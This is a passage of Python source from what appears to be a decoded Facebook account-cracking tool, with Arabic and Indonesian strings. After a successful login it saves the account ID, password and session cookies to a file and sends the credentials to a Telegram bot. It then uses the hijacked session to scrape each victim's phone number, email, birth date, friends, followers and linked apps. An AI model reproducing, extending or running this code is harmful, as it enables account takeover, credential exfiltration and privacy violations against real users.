                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    print('# DeCoDe By @CP_OK2')
                    infoakun += f'''الزعيم جابلك حساب يفرحك ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n ⋘─────━𓅓𝐙𝐀𝐈𝐌𓅓─────━⋙ \n:@fahad_zaim⏎ قناتي لفك تشفير @ZZKGZ'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_SDMVIP(kuki)
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    print('# DeCoDe By @CP_OK2')
                    infoakun += f'''الزعيم جابلك حساب يفرحك 🔥💜❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n ⋘─────━𓅓𝐙𝐀𝐈𝐌𓅓─────━⋙ \n:@fahad_zaim⏎ قناتي لفك تشفير @ZZKGZ'''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    print('# DeCoDe By @CP_OK2')
                    infoakun += f'''دز سكرين لخوك الزعيم يفرح وياك🔥💜❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n ⋘─────━𓅓𝐙𝐀𝐈𝐌𓅓─────━⋙ \n:@fahad_zaim⏎ قناتي لفك تشفير @ZZKGZ'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_SDMVIP(kuki)
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def cek_SDMVIP(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))
        


if __name__ == '__main__':
    
    try:os.system('git pull')
    except:pass
    
    try:os.mkdir('OK')
    except:pass
    
    try:os.mkdir('CP')
    except:pass
    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass
    
    try:os.system('touch .prox.txt')
    except:pass
    
    try:os.system('pkg install play-audio')
    except:pass

    try:os.system('clear')
    except:pass
    SDM()
    
# DeCoDe By @CP_OK2    